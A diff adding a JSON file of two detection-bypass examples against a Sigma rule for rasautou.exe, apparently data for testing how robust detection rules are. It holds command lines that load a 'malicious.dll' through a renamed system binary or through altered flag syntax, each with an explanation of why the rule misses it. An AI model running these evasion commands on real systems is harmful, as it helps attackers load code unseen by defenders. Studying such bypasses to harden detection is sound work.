@@ -1,0 +1,10 @@
+[
+  {
+    "output": "copy C:\\Windows\\System32\\rasautou.exe C:\\Users\\Public\\not_ras.exe && C:\\Users\\Public\\not_ras.exe -d \"C:\\path\\to\\malicious.dll\" -p \"ExportName\"",
+    "explanation": "The Sigma rule relies on the 'selection_img' logic, which checks if the process image path ends with '\\rasautou.exe'. By copying the binary to a different location and renaming it, the process creation event will log a different image name (e.g., 'not_ras.exe'), failing the first part of the detection condition."
+  },
+  {
+    "output": "rasautou.exe  -d:\"C:\\test.dll\"  -p:\"DllMain\"",
+    "explanation": "The rule uses 'CommandLine|contains|all' with specific strings ' -d ' and ' -p ' (including spaces). On Windows, many command-line parsers treat colons or extra whitespace differently. By using a colon immediately after the flag or adding extra spaces, the exact string match ' -d ' may fail while the application still executes the parameters correctly."
+  }
+]
